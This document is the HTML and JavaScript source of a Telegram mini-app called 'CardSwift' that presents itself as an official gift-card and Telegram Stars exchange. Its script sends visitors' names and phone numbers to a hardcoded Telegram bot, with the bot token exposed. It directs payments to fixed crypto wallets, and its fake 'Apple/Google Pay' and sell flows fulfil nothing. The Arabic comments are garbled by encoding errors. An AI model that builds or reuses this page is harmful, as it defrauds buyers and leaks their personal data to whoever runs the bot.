<!DOCTYPE html>
<html lang="en" id="html-tag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CardSwift | Elite Exchange</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #3b82f6; --bg: #020617; }
        body { font-family: 'Poppins', 'Noto Sans Arabic', sans-serif; background-color: var(--bg); color: white; margin: 0; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .stars-bg { background: radial-gradient(circle at top, #1e1b4b 0%, #020617 100%); min-height: 100vh; position: relative; }
        .stars-bg::after { content: ""; position: absolute; inset: 0; background-image: url('https://www.transparenttextures.com/patterns/stardust.png'); opacity: 0.3; pointer-events: none; }
        .card-style { background: rgba(30, 41, 59, 0.3); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 2rem; transition: 0.4s; cursor: pointer; }
        .card-style:hover { border-color: var(--accent); transform: translateY(-5px); box-shadow: 0 20px 40px rgba(59, 130, 246, 0.15); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(15px); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: #0f172a; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 2.5rem; width: 100%; max-width: 480px; position: relative; padding: 2.5rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .close-btn { position: absolute; top: 1.5rem; right: 1.5rem; cursor: pointer; color: #64748b; }
        .price-chip { cursor: pointer; border: 1px solid #334155; transition: 0.3s; background: rgba(15, 23, 42, 0.6); border-radius: 1.2rem; display: flex; align-items: center; justify-content: center; font-weight: 700; }
        .price-chip.active { background: var(--accent); border-color: #60a5fa; transform: scale(1.05); box-shadow: 0 0 20px rgba(59, 130, 246, 0.4); }
        input, select { background: #020617 !important; border: 1px solid #1e293b !important; color: white !important; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--accent) !important; }
        .glow-button { background: linear-gradient(135deg, #2563eb, #1d4ed8); transition: 0.3s; box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3); }
        .glow-button:active { transform: scale(0.98); }
        .hidden-section { display: none; }
        [dir="rtl"] .close-btn { right: auto; left: 1.5rem; }

        /* ÿ≤ÿ± ÿßŸÑÿØŸÅÿπ ÿßŸÑŸÅÿÆŸÖ ÿ®ÿßŸÑÿ£ÿπŸÑŸâ */
        .pay-btn-elite {
            background: #ffffff;
            color: #000;
            border-radius: 1.25rem;
            padding: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-weight: 900;
            cursor: pointer;
            transition: 0.3s;
            border: none;
            width: 100%;
            margin-bottom: 15px;
            box-shadow: 0 10px 25px rgba(255,255,255,0.1);
        }
        .pay-btn-elite:active { transform: scale(0.97); background: #f1f5f9; }
    </style>
</head>
<body class="stars-bg">

    <nav class="sticky top-0 z-50 bg-[#020617]/90 backdrop-blur-xl border-b border-white/5">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <div class="flex items-center gap-2 cursor-pointer group" onclick="location.reload()">
                <div class="p-2 bg-blue-600 rounded-xl shadow-lg shadow-blue-600/20">
                    <svg width="24" height="24" viewBox="0 0 100 100"><path d="M35 50 L55 20 L55 45 L75 45 L55 80 L55 55 Z" fill="white"/></svg>
                </div>
                <span class="text-2xl font-black tracking-tighter uppercase">Card<span class="text-blue-500">Swift</span></span>
            </div>
            <div class="flex gap-2">
                <button onclick="setLang('en')" class="text-[10px] font-bold border border-slate-700 px-3 py-1 rounded-full hover:bg-white hover:text-black transition">EN</button>
                <button onclick="setLang('ar')" class="text-[10px] font-bold border border-slate-700 px-3 py-1 rounded-full hover:bg-white hover:text-black transition">AR</button>
            </div>
        </div>
    </nav>

    <div id="home-section" class="max-w-7xl mx-auto px-6 pt-12">
        <div class="text-center mb-12">
            <h1 id="txt-hero-title" class="text-5xl md:text-7xl font-black mb-4 bg-gradient-to-b from-white to-slate-500 bg-clip-text text-transparent italic uppercase">Elite Exchange</h1>
            <p id="txt-hero-desc" class="text-slate-400 text-sm max-w-md mx-auto">Official Telegram Stars & Assets Gateway.</p>
        </div>
        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 pb-32">
            <div class="card-style p-6 text-center" onclick="openChoice('Razer Gold', 'https://i.postimg.cc/JzGr8KfP/razer-gold.jpg')"><img src="https://i.postimg.cc/JzGr8KfP/razer-gold.jpg" class="h-20 mx-auto mb-4 object-contain"><h3 class="font-bold text-sm">Razer Gold</h3></div>
            <div class="card-style p-6 text-center" onclick="openChoice('PlayStation', 'https://i.postimg.cc/wjTtmhST/download.png')"><img src="https://i.postimg.cc/wjTtmhST/download.png" class="h-20 mx-auto mb-4 object-contain"><h3 class="font-bold text-sm">PlayStation</h3></div>
            <div class="card-style p-6 text-center" onclick="openChoice('iTunes', 'https://i.postimg.cc/1zV3GMM1/itunes.jpg')"><img src="https://i.postimg.cc/1zV3GMM1/itunes.jpg" class="h-20 mx-auto mb-4 object-contain"><h3 class="font-bold text-sm">iTunes</h3></div>
            <div class="card-style p-6 text-center" onclick="openChoice('Google Play', 'https://i.postimg.cc/SKRzwWrr/download.jpg')"><img src="https://i.postimg.cc/SKRzwWrr/download.jpg" class="h-20 mx-auto mb-4 object-contain"><h3 class="font-bold text-sm">Google Play</h3></div>
        </div>
    </div>

    <div id="regModal" class="modal">
        <div class="modal-content">
            <h2 id="txt-reg-title" class="text-2xl font-black text-center mb-6 uppercase">User Verification</h2>
            <div class="space-y-4">
                <input type="text" id="reg-name" placeholder="Enter Full Name" class="w-full p-4 rounded-2xl text-sm">
                <div class="flex gap-2">
                    <select id="country-code" class="p-4 rounded-2xl text-[10px] w-32 border border-slate-800"></select>
                    <input type="number" id="reg-phone" placeholder="Phone Number" class="flex-1 p-4 rounded-2xl text-sm">
                </div>
                <button onclick="startVerification()" id="txt-reg-btn" class="glow-button w-full py-5 rounded-2xl font-black mt-4 uppercase text-xs tracking-widest">Start Trading</button>
            </div>
        </div>
    </div>

    <div id="choiceModal" class="modal">
        <div class="modal-content text-center">
            <div class="close-btn" onclick="closeAllModals()"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg></div>
            <h3 id="choiceTitle" class="text-3xl font-black mb-10 text-blue-400 italic"></h3>
            <div class="grid grid-cols-1 gap-4">
                <button onclick="checkAccess('BUY')" class="bg-emerald-600 py-6 rounded-3xl font-black uppercase text-lg hover:bg-emerald-500 transition">BUY CARD</button>
                <button onclick="checkAccess('SELL')" class="bg-blue-600 py-6 rounded-3xl font-black uppercase text-lg hover:bg-blue-500 transition">SELL CARD</button>
            </div>
        </div>
    </div>

    <div id="action-section" class="hidden-section max-w-2xl mx-auto px-6 py-10">
        <div class="card-style p-8 md:p-12">
            <div class="text-center mb-10">
                <img id="action-img" src="" class="h-24 mx-auto mb-4">
                <h2 id="action-card-name" class="text-3xl font-black italic"></h2>
                <div id="action-type-badge" class="inline-block px-4 py-1 bg-blue-600/20 text-blue-400 rounded-full text-[10px] font-bold uppercase mt-2"></div>
            </div>
            
            <div class="grid grid-cols-3 gap-3 mb-10">
                <div class="price-chip h-16 text-sm" onclick="selectAmount(10)">$10</div>
                <div class="price-chip h-16 text-sm" onclick="selectAmount(50)">$50</div>
                <div class="price-chip h-16 text-sm" onclick="selectAmount(100)">$100</div>
            </div>

            <div id="buy-options" class="hidden-section space-y-4">
                <button onclick="handleStarsPayment()" class="pay-btn-elite">
                    <img src="https://img.icons8.com/ios-filled/50/000000/apple-pay.png" class="h-6">
                    <div class="w-[1px] h-6 bg-black/20"></div>
                    <img src="https://img.icons8.com/color/48/google-pay.png" class="h-6">
                    <span class="text-sm">Pay with Apple/Google</span>
                </button>

                <div class="flex items-center gap-4 opacity-20 py-2"><div class="flex-1 h-[1px] bg-white"></div><span class="text-[9px] font-bold uppercase">Or Crypto</span><div class="flex-1 h-[1px] bg-white"></div></div>

                <div class="grid grid-cols-3 gap-3">
                    <button onclick="showAddress('TRC20')" class="bg-slate-800/50 p-4 rounded-xl text-[10px] font-bold border border-white/5">TRC20</button>
                    <button onclick="showAddress('BEP20')" class="bg-slate-800/50 p-4 rounded-xl text-[10px] font-bold border border-white/5">BEP20</button>
                    <button onclick="showAddress('ERC20')" class="bg-slate-800/50 p-4 rounded-xl text-[10px] font-bold border border-white/5">ERC20</button>
                </div>
                <div id="address-box" class="hidden-section bg-slate-950 p-6 rounded-2xl border border-blue-500/20 text-center animate-pulse">
                    <p id="wallet-to-copy" class="text-[10px] font-mono mb-4 text-blue-400 break-all"></p>
                    <button onclick="copyWallet()" class="bg-blue-600 px-10 py-2 rounded-full text-[10px] font-black uppercase">Copy Wallet</button>
                </div>
            </div>

            <div id="sell-options" class="hidden-section space-y-8">
                <div class="bg-blue-600/10 p-8 rounded-3xl flex justify-between items-center border border-blue-500/20">
                    <span class="text-sm font-bold">You Receive:</span><span id="receive-amount" class="text-3xl font-black text-green-400">0.00 USDT</span>
                </div>
                <input type="text" id="sellWallet" placeholder="Your USDT Address (TRC20)" class="w-full p-5 rounded-2xl text-sm">
            </div>

            <button id="submitBtn" onclick="finalSubmit()" class="glow-button w-full py-6 rounded-3xl font-black mt-12 text-xl shadow-2xl uppercase tracking-wider">Confirm Transaction</button>
            <button onclick="location.reload()" class="w-full text-slate-500 text-[10px] mt-8 font-black uppercase tracking-widest opacity-40">Cancel & Return</button>
        </div>
    </div>

    <script>
        // ÿ™ŸáŸäÿ¶ÿ© ŸÖÿ≠ÿ±ŸÉ ÿßŸÑŸÄ Mini App
        const TG = window.Telegram.WebApp;
        TG.expand();
        TG.ready();

        const TG_TOKEN = "8595088465:AAE5RPjItCt8Zm0irKMOP-Wd39Vlv0neKKI";
        const TG_ID = "7865246557";
        const WALLETS = { 'BEP20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0', 'TRC20': 'TVB3yoKYrw81vwKrMgqfvhuMmoQVXozgcf', 'ERC20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0' };

        let userData = {}; let isRegistered = false; let pendingAction = ""; let activeName = ""; let activeImg = ""; let selectedVal = 0;

        // --- Ÿàÿ∏ŸäŸÅÿ© ÿßŸÑÿØŸÅÿπ ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ© (API ÿßŸÑŸÜÿ¨ŸàŸÖ) ---
        function handleStarsPayment() {
            if(!selectedVal) return TG.showAlert("Please select an amount first!");
            
            // ÿ•ÿ∏Ÿáÿßÿ± Ÿàÿßÿ¨Ÿáÿ© ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ
            TG.MainButton.setText("PROCESSING PAYMENT...");
            TG.MainButton.show();
            TG.MainButton.showProgress();

            // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿ•ŸÜÿ¥ÿßÿ° ÿßŸÑŸÅÿßÿ™Ÿàÿ±ÿ© (Invoice)
            TG.sendData(JSON.stringify({
                method: "stars_invoice_request",
                item: activeName,
                price: selectedVal,
                user: userData.name,
                phone: userData.phone
            }));

            // ÿ™ŸÜÿ®ŸäŸá ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ
            setTimeout(() => {
                TG.MainButton.hideProgress();
                TG.MainButton.hide();
                TG.showAlert("A secure payment link has been sent to your chat. Please complete the purchase using Apple/Google Pay there.");
            }, 1200);
        }

        // --- ÿßŸÑŸàÿ∏ÿßÿ¶ŸÅ ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ© ŸÑŸÑŸÖŸàŸÇÿπ ---
        function openChoice(n, i) { 
            activeName = n; activeImg = i; 
            document.getElementById('choiceTitle').innerText = n; 
            document.getElementById('choiceModal').style.display = 'flex'; 
        }

        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }

        function checkAccess(a) { 
            pendingAction = a; 
            closeAllModals();
            if (isRegistered) executeAction(); else document.getElementById('regModal').style.display = 'flex'; 
        }

        function startVerification() {
            userData = { 
                name: document.getElementById('reg-name').value, 
                phone: document.getElementById('country-code').value + document.getElementById('reg-phone').value 
            };
            if(!userData.name || !userData.phone) return TG.showAlert("Information required!");
            
            // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÑÿ®Ÿàÿ™ ŸÑŸÑÿ™Ÿàÿ´ŸäŸÇ
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_ID, text: `üë§ NEW MINI-APP USER:\nName: ${userData.name}\nPhone: ${userData.phone}` })
            });

            isRegistered = true;
            closeAllModals();
            executeAction();
        }

        function executeAction() {
            document.getElementById('home-section').style.display = 'none';
            document.getElementById('action-section').classList.remove('hidden-section');
            document.getElementById('action-card-name').innerText = activeName;
            document.getElementById('action-img').src = activeImg;
            document.getElementById('action-type-badge').innerText = pendingAction;
            
            if(pendingAction === 'BUY') {
                document.getElementById('buy-options').classList.remove('hidden-section');
                document.getElementById('sell-options').classList.add('hidden-section');
            } else {
                document.getElementById('sell-options').classList.remove('hidden-section');
                document.getElementById('buy-options').classList.add('hidden-section');
            }
            window.scrollTo(0,0);
        }

        function selectAmount(v) { 
            selectedVal = v; 
            document.querySelectorAll('.price-chip').forEach(c => {
                c.classList.remove('active');
                if(c.innerText === '$'+v) c.classList.add('active');
            });
            document.getElementById('receive-amount').innerText = (v * 0.95).toFixed(2) + " USDT"; 
        }

        function showAddress(n) {
            document.getElementById('address-box').classList.remove('hidden-section');
            document.getElementById('wallet-to-copy').innerText = WALLETS[n];
        }

        function copyWallet() {
            navigator.clipboard.writeText(document.getElementById('wallet-to-copy').innerText);
            TG.HapticFeedback.notificationOccurred('success');
            TG.showAlert("Wallet Address Copied!");
        }

        async function finalSubmit() {
            if(!selectedVal) return TG.showAlert("Please select an amount!");
            const btn = document.getElementById('submitBtn');
            btn.innerText = "SUBMITTING...";
            btn.disabled = true;

            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: TG_ID, 
                    text: `üì¢ NEW ORDER:\nUser: ${userData.name}\nAction: ${pendingAction}\nItem: ${activeName}\nAmount: $${selectedVal}` 
                })
            });

            TG.showConfirm("Order submitted! Do you want to return home?", (res) => {
                if(res) location.reload();
            });
        }

        // ÿ•ÿπÿØÿßÿØ ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑÿØŸàŸÑ
        const countryData = [
            {n:"Iraq", c:"+964", f:"üáÆüá∂"}, {n:"Saudi", c:"+966", f:"üá∏üá¶"}, 
            {n:"UAE", c:"+971", f:"üá¶üá™"}, {n:"USA", c:"+1", f:"üá∫üá∏"}
        ];
        const countrySelect = document.getElementById('country-code');
        countryData.forEach(ct => { 
            let opt = document.createElement('option'); 
            opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c}`; 
            countrySelect.appendChild(opt); 
        });

        function setLang(l) { document.getElementById('html-tag').dir = (l === 'ar') ? 'rtl' : 'ltr'; }
    </script>
</body>
</html>
